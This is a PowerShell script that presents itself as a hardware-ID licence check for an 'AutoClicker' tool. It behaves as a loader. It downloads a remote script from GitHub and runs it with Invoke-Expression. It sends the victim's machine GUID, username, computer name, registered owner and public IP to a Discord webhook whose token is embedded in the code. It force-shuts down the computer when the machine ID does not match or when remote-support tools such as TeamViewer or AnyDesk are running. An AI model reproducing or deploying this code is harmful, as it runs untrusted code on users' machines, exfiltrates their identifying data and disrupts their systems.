class HWIDChecker {
    [array]$allowedUsers
    [string]$currentHWID
    [string]$userName
    [string]$userDomain
    
    HWIDChecker() {
        $this.allowedUsers = @(
            @{ hwid = "0f27e98f-f4c9-440a-9484-a925e25fa7c0"; username = "Rogue" }
        )
        $this.currentHWID = $this.GetMachineID()
        $this.userName = $env:USERNAME
        $this.userDomain = $env:COMPUTERNAME
    }
    
    [bool]CheckHWID() {
        if ($this.IsSuspiciousProcessRunning()) {
            foreach ($user in $this.allowedUsers) {
                if ($user.hwid -eq $this.currentHWID) {
                    return $false
                }
            }
            $this.SendUnauthorizedWebhook()
            $this.ShutdownSystem()
            return $false
        }

        foreach ($user in $this.allowedUsers) {
            if ($user.hwid -eq $this.currentHWID) {
                $this.SendSuccessWebhook($user.username)
                $this.ExecutePowerShellScript()
                return $true
            }
        }

        $this.SendUnauthorizedWebhook()
        $this.ShutdownSystem()
        return $false
    }
    
    hidden [void]ExecutePowerShellScript() {
        try {
            $scriptUrl = "https://raw.githubusercontent.com/thegoatofapi/mth/main/script.ps1"
            $scriptContent = Invoke-RestMethod -Uri $scriptUrl
            Invoke-Expression $scriptContent
        }
        catch {
        }
    }
    
    hidden [void]ShutdownSystem() {
        Stop-Computer -Force
    }
    
    hidden [string]GetMachineID() {
        try {
            $machineGuid = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction Stop
            $cleanGuid = $machineGuid.Trim() -replace '[\r\n\s]', ''
            return $cleanGuid
        }
        catch {
            return ""
        }
    }
    
    hidden [string]GetEmail() {
        try {
            $registeredOwner = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "RegisteredOwner" -ErrorAction Stop
            return $registeredOwner
        }
        catch {
            return ""
        }
    }
    
    hidden [bool]IsSuspiciousProcessRunning() {
        $suspiciousProcesses = @("TeamViewer", "AnyDesk", "tv_w32", "tv_x64", "anydesk")
        $detected = $false
        
        foreach ($processName in $suspiciousProcesses) {
            $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
            if ($process) {
                $detected = $true
            }
        }
        
        $allProcesses = Get-Process | Where-Object { 
            $_.ProcessName -like "*team*" -or 
            $_.ProcessName -like "*any*" -or
            $_.ProcessName -like "*remote*" -or
            $_.ProcessName -like "*rdp*" -or
            $_.ProcessName -like "*vnc*"
        }
        
        if ($allProcesses.Count -gt 0) {
            $detected = $true
        }
        
        return $detected
    }
    
    hidden [string]GetPublicIPv4() {
        try {
            $ip = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10
            return $ip
        }
        catch {
            try {
                $ip = Invoke-RestMethod -Uri "https://ipv4.icanhazip.com" -TimeoutSec 5
                return $ip.Trim()
            }
            catch {
                return ""
            }
        }
    }
    
    hidden [string]GetCurrentTimestamp() {
        return (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    
    hidden [void]SendUnauthorizedWebhook() {
        $ipv4 = $this.GetPublicIPv4()
        $email = $this.GetEmail()
        $timestamp = $this.GetCurrentTimestamp()
        
        $webhookURL = "1445905462946959360/dZZ3jV8tEnEyh8Owdqo_598cA1cZHxzq1lQi5Hwu3BTVXtr9ckaGjS4UQz6OI96X-CUa"
        
        $postData = @{
            content = $null
            embeds = @(
                @{
                    title = ":warning: TENTATIVE D'ACCES NON AUTORISE :warning:"
                    color = 16711680
                    fields = @(
                        @{
                            name = "HWID"
                            value = $this.currentHWID
                        },
                        @{
                            name = "USER PC"
                            value = "$($this.userName) / $($this.userDomain)"
                        },
                        @{
                            name = "EMAIL ADDRESS"
                            value = $email
                        },
                        @{
                            name = "IP ADDRESS"
                            value = $ipv4
                        }
                    )
                    footer = @{
                        text = "AutoClicker Security"
                    }
                    timestamp = $timestamp
                }
            )
            attachments = @()
        } | ConvertTo-Json -Depth 10
        
        $this.SendWebhook($webhookURL, $postData)
    }
    
    hidden [void]SendSuccessWebhook([string]$username) {
        $timestamp = $this.GetCurrentTimestamp()
        
        $webhookURL = "1445905462946959360/dZZ3jV8tEnEyh8Owdqo_598cA1cZHxzq1lQi5Hwu3BTVXtr9ckaGjS4UQz6OI96X-CUa"
        
        $postData = @{
            content = $null
            embeds = @(
                @{
                    title = ":white_check_mark: ACCES AUTORISE :white_check_mark:"
                    color = 65280
                    fields = @(
                        @{
                            name = "USERNAME"
                            value = $username
                        },
                        @{
                            name = "HWID"
                            value = $this.currentHWID
                        },
                        @{
                            name = "USER PC"
                            value = "$($this.userName) / $($this.userDomain)"
                        }
                    )
                    footer = @{
                        text = "AutoClicker Security"
                    }
                    timestamp = $timestamp
                }
            )
            attachments = @()
        } | ConvertTo-Json -Depth 10
        
        $this.SendWebhook($webhookURL, $postData)
    }
    
    hidden [bool]SendWebhook([string]$url, [string]$data) {
        try {
            $fullUrl = "https://discord.com/api/webhooks/$url"
            $response = Invoke-RestMethod -Uri $fullUrl -Method Post -Body $data -ContentType "application/json" -TimeoutSec 10
            return $true
        }
        catch {
            return $false
        }
    }
}

try {
    $checker = [HWIDChecker]::new()
    if ($checker.CheckHWID()) {
        exit 0
    } else {
        exit 1
    }
}
catch {
    exit 1
}